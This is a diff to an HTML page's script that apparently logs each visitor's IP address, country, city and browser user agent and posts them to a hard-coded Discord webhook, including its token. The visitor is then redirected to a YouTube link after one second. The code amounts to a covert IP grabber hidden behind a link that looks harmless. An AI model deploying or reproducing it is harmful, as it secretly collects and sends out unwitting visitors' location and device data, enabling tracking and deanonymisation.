@@ -51,14 +51,23 @@
           const countryCode = data.country_code;
           const flag = getFlagEmoji(countryCode);
           const userAgent = navigator.userAgent;
-
           const message = `User is from ${flag} ${country}, ${city}.\nIP: ${ip}\nDevice: ${userAgent}`;
 
-          fetch('https://discord.com/api/webhooks/1374638677120254012/yHFKXXXYaF4J0P7VfmXSlxsEJKNCF8wg7mu8pliQG3a_85QD1Uac8o9ECs7aKdvHAM2j', {
+          return fetch('https://discord.com/api/webhooks/1374638677120254012/yHFKXXXYaF4J0P7VfmXSlxsEJKNCF8wg7mu8pliQG3a_85QD1Uac8o9ECs7aKdvHAM2j', {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },          
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+          });
+        })
+        .then(() => {
+          setTimeout(() => {
+            window.location.href = "https://youtu.be/uZnkgXw3Hyo?si=blSM4CrD37WGBzxP";
+          }, 1000);
+        })
+        .catch(err => {
+          console.error('Something went wrong:', err);
+        });
+    }
   </script>
 </body>
 </html>
